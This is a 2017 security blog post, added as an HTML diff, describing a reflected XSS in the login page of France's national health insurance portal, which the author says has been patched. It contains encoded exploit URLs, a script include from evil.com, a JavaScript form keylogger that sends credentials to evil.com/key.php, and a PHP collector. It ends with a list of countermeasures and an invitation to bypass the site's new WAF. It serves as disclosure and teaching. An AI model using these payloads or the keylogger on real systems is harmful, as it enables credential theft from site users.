@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      A fun case of XSS and other web concepts &middot; Lanyon
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/web/2017/07/25/xss-real-life-case-credentials-stealing/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>A reserved <a href="https://jekyllrb.com" target="_blank">Jekyll</a> theme that places the utmost gravity on content with a hidden drawer. Made by <a href="https://twitter.com/mdo" target="_blank">@mdo</a>.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+
+    
+
+    
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+          <a class="sidebar-nav-item" href="http://localhost:4000/about/">About</a>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+
+    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
+    <a class="sidebar-nav-item" href="">GitHub project</a>
+    <span class="sidebar-nav-item">Currently v1.1.0</span>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2020. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Lanyon</a>
+            <small>A Jekyll theme</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">A fun case of XSS and other web concepts</h1>
+  <span class="post-date">25 Jul 2017</span>
+  <p>Hello folks,</p>
+
+<p>I would like to share with you a practical case of reflected XSS while i was looking at my national health service account. Right now the XSS has been patched (we have an efficient dedicated national service where we can report such issues).</p>
+
+<p><strong>What is the issue:</strong><br />
+A reflected <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a> in the login field at the authentication page from the website https://assure.ameli.fr where all french citizen are consulting their social security account. Some digits are required but setting some alphacharacters as login will return the string in uppercase.</p>
+
+<p><strong>Where is the issue</strong><br />
+So i set:<br />
+<img src="http://localhost:4000/public/images/xss-practical-case/image1.png" alt="image1" /></p>
+
+<p>And i got:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"connexionCompteForm"</span> <span class="na">id=</span><span class="s">"connexioncompte_2connexionCompteForm"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"https://assure.ameli.fr:443/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;amp;_windowLabel=connexioncompte_2&amp;amp;connexioncompte_2_actionOverride=%2Fportlets%2Fconnexioncompte%2Fvalidationconnexioncompte&amp;amp;_pageLabel=as_login_page"</span> <span class="na">class=</span><span class="s">"r_cnx_form"</span><span class="nt">&gt;</span>
+...
+<span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"connexioncompte_2nir_as"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">value=</span><span class="s">"THEPOSTLOGIN"</span> <span class="na">maxlength=</span><span class="s">"13"</span> <span class="na">size=</span><span class="s">"13"</span> <span class="na">placeholder=</span><span class="s">"Mon numéro de sécurité sociale"</span> <span class="na">title=</span><span class="s">"Mon numéro de sécurité sociale"</span> <span class="na">tabindex=</span><span class="s">"3"</span> <span class="na">name=</span><span class="s">"connexioncompte_2numSecuriteSociale"</span> <span class="nt">/&gt;</span>
+...
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+
+<p>Let’s try something else with the login <strong>toto&lt;&gt;”’();/:</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input id="connexioncompte_2nir_as" type="text" value="TOTO&lt;&gt;"'();/\" maxlength="13" ...
+</code></pre></div></div>
+
+<p>No escaping, no sanitizing or HTML encoding but we will have to deal with UPPERCASE. HTML is not case sensitive but javascript is, so we will do some HEX encoding for the javascript part.</p>
+
+<p><strong>First payload:</strong><br />
+We can test the XSS thanks to this payload (alert):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=" /&gt;&lt;IMG SRC=X ONERROR=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;(&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x64;&amp;#x6F;&amp;#x6D;&amp;#x61;&amp;#x69;&amp;#x6E;) hidden&gt;&lt;nimp "&amp;connexioncompte_2codeConfidentiel=&amp;connexioncompte_2actionEvt=connecter
+</code></pre></div></div>
+
+<p>Full payload url encoded:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=%22%20%2F%3E%3CIMG%20SRC%3DX%20ONERROR%3D%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x64%3B%26%23x6F%3B%26%23x6D%3B%26%23x61%3B%26%23x69%3B%26%23x6E%3B)%20hidden%3E%3Cnimp%20%22&amp;connexioncompte_2codeConfidentiel=&amp;connexioncompte_2actionEvt=connecter
+</code></pre></div></div>
+
+<p><em>But wait… you process a GET request and you were talking about a form with POST method ?</em><br />
+Yes, there but there is no server-side filter on the specific POST method.</p>
+
+<p>So what do we have?<br />
+<img src="http://localhost:4000/public/images/xss-practical-case/image2.png" alt="image2" /></p>
+
+<p>It works because i’m using Firefox, IE and Chrome embed a reflected XSS auditor and will prevent this kind of javascript execution. Back to the javascript part, now we will just call our own javascript file. With our next payload, we will take care to keep the webpage as it is (no error message, keeping placeholder, …).</p>
+
+<p><strong>Second payload:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" name="connexioncompte_2numSecuriteSociale" placeholder="&amp;#x4d;&amp;#x6f;&amp;#x6e;&amp;#x20;&amp;#x6e;&amp;#x75;&amp;#x6d;&amp;#xe9;&amp;#x72;&amp;#x6f;&amp;#x20;&amp;#x64;&amp;#x65;&amp;#x20;&amp;#x73;&amp;#xe9;&amp;#x63;&amp;#x75;&amp;#x72;&amp;#x69;&amp;#x74;&amp;#xe9;&amp;#x20;&amp;#x73;&amp;#x6f;&amp;#x63;&amp;#x69;&amp;#x61;&amp;#x6c;&amp;#x65;" /&gt;&lt;script src='https://evil.com/poc/poc.js'&gt;&lt;/script&gt;&lt;nimp "
+</code></pre></div></div>
+
+<p>Full payload url encoded:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=%22%20name%3D%22connexioncompte_2numSecuriteSociale%22%20placeholder%3D%22%26%23x4d%3B%26%23x6f%3B%26%23x6e%3B%26%23x20%3B%26%23x6e%3B%26%23x75%3B%26%23x6d%3B%26%23xe9%3B%26%23x72%3B%26%23x6f%3B%26%23x20%3B%26%23x64%3B%26%23x65%3B%26%23x20%3B%26%23x73%3B%26%23xe9%3B%26%23x63%3B%26%23x75%3B%26%23x72%3B%26%23x69%3B%26%23x74%3B%26%23xe9%3B%26%23x20%3B%26%23x73%3B%26%23x6f%3B%26%23x63%3B%26%23x69%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%22%20%2F%3E%3Cscript%20src%3D%27https%3A%2F%2Fevil.com%2Fpoc%2Fpoc.js%27%3E%3C%2Fscript%3E%3Cnimp%20%22&amp;connexioncompte_2codeConfidentiel=&amp;connexioncompte_2actionEvt=connecter
+</code></pre></div></div>
+
+<p>On our apache we are creating the web tree <em>POC/POC.JS</em> (scheme and domain name are not case sensitive). But does a little bird sing the word CORS (Cross-Origin Resource Sharing)?</p>
+
+<p>Here are some examples of resources which may be embedded cross-origin (<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a>):</p>
+<ul>
+  <li>JavaScript with <code class="language-plaintext highlighter-rouge">&lt;script src="..."&gt;&lt;/script&gt;</code>. Error messages for syntax errors are only available for same-origin scripts.</li>
+  <li>CSS with <code class="language-plaintext highlighter-rouge">&lt;link rel="stylesheet" href="..."&gt;</code>. Due to the relaxed syntax rules of CSS, cross-origin CSS requires a correct Content-Type header. Restrictions vary by browser: IE, Firefox, Chrome, Safari (scroll down to CVE-2010-0051) and Opera.</li>
+  <li>Images with <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code>. Supported image formats include PNG, JPEG, GIF, BMP, SVG, …</li>
+  <li>Media files with <code class="language-plaintext highlighter-rouge">&lt;video&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;audio&gt;</code>.</li>
+  <li>Plug-ins with <code class="language-plaintext highlighter-rouge">&lt;object&gt;</code>, <code class="language-plaintext highlighter-rouge">&lt;embed&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;applet&gt;</code>.</li>
+  <li>Fonts with <code class="language-plaintext highlighter-rouge">@font-face</code>. Some browsers allow cross-origin fonts, others require same-origin fonts.</li>
+  <li>Anything with <code class="language-plaintext highlighter-rouge">&lt;frame&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code>. A site can use the X-Frame-Options header to prevent this form of cross-origin interaction.</li>
+</ul>
+
+<p>But in fact whatever… we are owning the web server we would be able to add if it was necessary the response header <code class="language-plaintext highlighter-rouge">access-control-allow-origin: *</code> for any ressources.</p>
+
+<p>But what kind of cool javascript payload can we inject? (knowing that the JSESSIONID cookie has the flag HttpOnly so not accessible via javascript).</p>
+
+<p><img src="http://localhost:4000/public/images/xss-practical-case/image3.png" alt="image3" /></p>
+
+<p>We will add a callback function that will be executed once the web page forms will be submitted (allowing us to capture the credentials). Check <a href="https://github.com/phackt/pentest/tree/master/exploits/js_keylogger">https://github.com/phackt/pentest/tree/master/exploits/js_keylogger</a> for source code.</p>
+
+<p><strong>POC.JS</strong>:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+	<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+	  	<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+	  		<span class="k">for</span><span class="p">(</span><span class="nx">e</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">e</span><span class="o">&lt;</span><span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">e</span><span class="o">++</span><span class="p">){</span>
+	  			<span class="nx">keys</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">[name:</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">e</span><span class="p">].</span><span class="nx">name</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">,value:</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">e</span><span class="p">].</span><span class="nx">value</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">,type:</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">elements</span><span class="p">[</span><span class="nx">e</span><span class="p">].</span><span class="nx">type</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">;</span>
+	  			<span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://evil.com/key.php?c=</span><span class="dl">'</span><span class="o">+</span><span class="nx">keys</span><span class="p">;</span>
+	  		<span class="p">}</span>
+    	<span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>key.php</strong>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$logfile</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'data.txt'</span><span class="p">,</span> <span class="s1">'a+'</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>So suppose you are receiving a link which exploits the XSS vulnerability and you innocently enter your credentials to check your account, the attacker will receive:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[name:CONNEXIONCOMPTE_2NUMSECURITESOCIALE,value:1234567890123,type:text]
+[name:connexioncompte_2codeConfidentiel,value:89769874,type:password]
+[name:connexioncompte_2actionEvt,value:connecter,type:hidden]
+[name:submit,value:Valider,type:submit]
+</code></pre></div></div>
+
+<p>This kind of vulnerability could be part of a phishing campaign which encourages people to log in by clicking on the malicious link.</p>
+
+<p><strong>COUNTERMEASURES</strong>:</p>
+<ul>
+  <li>HTML Encoding (HTML entities and numeric character references) - <a href="https://en.wikipedia.org/wiki/Character_encodings_in_HTML">https://en.wikipedia.org/wiki/Character_encodings_in_HTML</a></li>
+  <li>Sanitizing</li>
+  <li>Escaping</li>
+  <li>White-listing</li>
+  <li>Explicit X-XSS-Protection header (<a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/X-XSS-Protection">https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/X-XSS-Protection</a>)</li>
+  <li>Only POST requests for sensitive operations</li>
+</ul>
+
+<p>Blocking all cross domains requests via a Content Security Policy rule (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a>) may be not relevant because a lot of these ressources are legitimate on a website. However we can do some subtle CSP rules in order to allow only what is needed.<br />
+But if a web site administrator wants all content to come from the site’s own origin (this excludes subdomains):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Security-Policy: default-src 'self'
+</code></pre></div></div>
+
+<p><strong>UPDATE 21/09/2017</strong>:<br />
+Apparently some waf is now blacklisting some malicious strings:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wafw00f https://assure.ameli.fr/
+...
+The site https://assure.ameli.fr/ is behind a F5 BIG-IP APM
+</code></pre></div></div>
+
+<p>Unfortunately the special characters are still not html encoded (test with <code class="language-plaintext highlighter-rouge">'';!--"&lt;XSS&gt;=&amp;{()}</code>).<br />
+Feel free to try to bypass it and let me know.</p>
+
+<p>Web applications are really interesting because of all the concepts you have to deal with.</p>
+
+<p>Hope you enjoyed.</p>
+
+<p>Phackt.</p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/dev/2020/05/27/git-secrets-exposed/">
+            What solutions to prevent git leaks ?
+            <small>27 May 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web/2018/08/05/web-exposed-git-repositories/">
+            Gathering some information from web exposed git repositories
+            <small>05 Aug 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web/2017/12/24/play-with-permissive-cors/">
+            Play with permissive CORS
+            <small>24 Dec 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+
+    <!-- <label for="sidebar-checkbox" class="sidebar-toggle"></label> -->
+
+    <script src='/public/js/script.js'></script>
+ 
+  </body>
+</html>
